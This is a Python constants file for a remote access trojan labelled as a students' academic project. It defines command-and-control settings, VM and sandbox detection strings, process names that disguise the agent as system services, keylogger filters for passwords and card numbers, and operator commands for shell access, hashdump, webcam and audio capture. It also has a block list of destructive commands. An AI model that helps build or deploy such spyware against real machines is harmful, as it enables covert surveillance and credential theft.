"""
Constants - Constantes partagées client/serveur
Définit les constantes globales utilisées dans tout le projet
"""

# === VERSIONS ===
PROJECT_VERSION = "1.0.0"
PROTOCOL_VERSION = "1.0"
CLIENT_VERSION = "1.0.0"
SERVER_VERSION = "1.0.0"

# === RÉSEAU ===
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8888
DEFAULT_BUFFER_SIZE = 4096
MAX_MESSAGE_SIZE = 50 * 1024 * 1024  # 50MB
SOCKET_TIMEOUT = 30
CONNECTION_TIMEOUT = 10

# === SÉCURITÉ ===
HEARTBEAT_INTERVAL = 30  # secondes
MAX_RECONNECT_ATTEMPTS = -1  # -1 = infini
RECONNECT_DELAY = 5  # secondes
SESSION_TIMEOUT = 300  # 5 minutes

# === LIMITATIONS DE SÉCURITÉ ===
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
MAX_SCREENSHOT_SIZE = 1920 * 1080
MAX_KEYLOG_DURATION = 600  # 10 minutes
MAX_WEBCAM_DURATION = 300  # 5 minutes
MAX_AUDIO_DURATION = 120  # 2 minutes
MAX_SEARCH_RESULTS = 100
MAX_SEARCH_DEPTH = 5

# === FORMATS ET CODAGE ===
DEFAULT_ENCODING = 'utf-8'
IMAGE_FORMATS = ['.jpg', '.jpeg', '.png', '.gif', '.bmp']
AUDIO_FORMATS = ['.wav', '.mp3', '.ogg']
VIDEO_FORMATS = ['.mp4', '.avi', '.mkv', '.mov']
ARCHIVE_FORMATS = ['.zip', '.rar', '.7z', '.tar', '.gz']

# === COMMANDES SYSTÈME ===
DANGEROUS_COMMANDS = [
    'format', 'del /s', 'rm -rf /', 'dd if=', 'mkfs',
    'shutdown', 'reboot', 'halt', 'killall', 'pkill'
]

# === RÉPERTOIRES SENSIBLES ===
SENSITIVE_DIRS_WINDOWS = [
    'windows/system32', 'windows/syswow64', 'program files',
    'program files (x86)', 'programdata'
]

SENSITIVE_DIRS_LINUX = [
    '/etc', '/usr/bin', '/usr/sbin', '/bin', '/sbin',
    '/root', '/var/log', '/proc', '/sys'
]

SENSITIVE_DIRS_MACOS = [
    '/system', '/usr/bin', '/usr/sbin', '/bin', '/sbin',
    '/library/system'
]

# === CODES D'ERREUR ===
ERROR_CODES = {
    'SUCCESS': 0,
    'GENERIC_ERROR': 1,
    'CONNECTION_ERROR': 2,
    'AUTHENTICATION_ERROR': 3,
    'PERMISSION_ERROR': 4,
    'FILE_NOT_FOUND': 5,
    'COMMAND_NOT_FOUND': 6,
    'TIMEOUT_ERROR': 7,
    'PROTOCOL_ERROR': 8,
    'ENCRYPTION_ERROR': 9,
    'RESOURCE_ERROR': 10
}

# === TYPES DE LOGS ===
LOG_LEVELS = {
    'DEBUG': 10,
    'INFO': 20,
    'WARNING': 30,
    'ERROR': 40,
    'CRITICAL': 50
}

# === EXTENSIONS AUTORISÉES ===
ALLOWED_DOWNLOAD_EXTENSIONS = {
    '.txt', '.log', '.cfg', '.conf', '.ini', '.xml', '.json',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.csv'
}

# === PATTERNS DANGEREUX ===
DANGEROUS_PATTERNS = [
    '&&', '||', ';', '|', '>', '>>', '<',
    '$(', '`', '${', 'eval', 'exec',
    '/dev/null', '/dev/zero', '/dev/random',
    'while true', 'while 1', 'for(;;)'
]

# === INDICATEURS DE VM/SANDBOX ===
VM_INDICATORS = [
    'virtualbox', 'vmware', 'qemu', 'xen', 'hyper-v',
    'vbox', 'vm', 'virtual', 'sandbox'
]

# === NOMS DE PROCESSUS FURTIFS ===
STEALTH_PROCESS_NAMES = {
    'windows': [
        'svchost.exe', 'dwm.exe', 'explorer.exe',
        'winlogon.exe', 'csrss.exe', 'lsass.exe'
    ],
    'linux': [
        'systemd', 'kthreadd', 'dbus-daemon',
        'NetworkManager', 'systemd-logind'
    ],
    'darwin': [
        'launchd', 'kernel_task', 'WindowServer',
        'Dock', 'Finder', 'loginwindow'
    ]
}

# === PARAMÈTRES WEBCAM ===
WEBCAM_MAX_RESOLUTION = (640, 480)
WEBCAM_DEFAULT_FPS = 5
WEBCAM_MAX_FPS = 15

# === PARAMÈTRES AUDIO ===
AUDIO_SAMPLE_RATE = 16000  # 16kHz
AUDIO_CHANNELS = 1  # Mono
AUDIO_SAMPLE_WIDTH = 2  # 16-bit
AUDIO_CHUNK_SIZE = 1024

# === PATTERNS DE FILTRAGE KEYLOGGER ===
SENSITIVE_PATTERNS = [
    'password', 'passwd', 'pwd', 'pin', 'ssn', 'cvv',
    'credit', 'card', 'bank', 'account', 'social'
]

# === PARAMÈTRES SSL/TLS ===
SSL_CERT_FILE = "server-certificate.pem"
SSL_KEY_FILE = "server-private-key.pem"
SSL_CA_FILE = "ca-certificate.pem"

# === MESSAGES D'AIDE ===
HELP_MESSAGES = {
    'server': """
Commandes serveur disponibles:
  help                 - Affiche cette aide
  sessions             - Liste les agents connectés
  interact <agent_id>  - Interagit avec un agent
  stats                - Statistiques du serveur
  cleanup              - Nettoie les sessions inactives
  broadcast <message>  - Diffuse un message
  clear                - Efface l'écran
  exit / quit          - Quitte le serveur
""",
    'client': """
Commandes client disponibles:
  help                    - Affiche cette aide
  shell <command>         - Exécute une commande shell
  ipconfig                - Configuration réseau
  sysinfo                 - Informations système
  download <file>         - Télécharge un fichier
  upload <local> <remote> - Upload un fichier
  search <filename>       - Recherche un fichier
  screenshot              - Capture d'écran
  webcam_snapshot         - Photo webcam
  webcam_stream           - Stream webcam
  keylogger <start/stop>  - Keylogger
  record_audio <duration> - Enregistrement audio
  hashdump                - Extraction hashes système
  back                    - Retour menu principal
"""
}

# === INFORMATIONS PROJET ===
PROJECT_INFO = {
    'name': 'RAT Project',
    'description': 'Remote Administration Tool - Academic Project',
    'author': 'Cybersecurity Students',
    'license': 'MIT',
    'purpose': 'Educational cybersecurity tool',
    'warning': '⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️'
}

# === CONFIGURATION PAR DÉFAUT ===
DEFAULT_CONFIG = {
    'server': {
        'host': DEFAULT_HOST,
        'port': DEFAULT_PORT,
        'use_ssl': False,
        'max_connections': 100,
        'debug': False
    },
    'client': {
        'server_host': DEFAULT_HOST,
        'server_port': DEFAULT_PORT,
        'use_ssl': False,
        'stealth_mode': False,
        'persistent': False,
        'debug': False
    }
}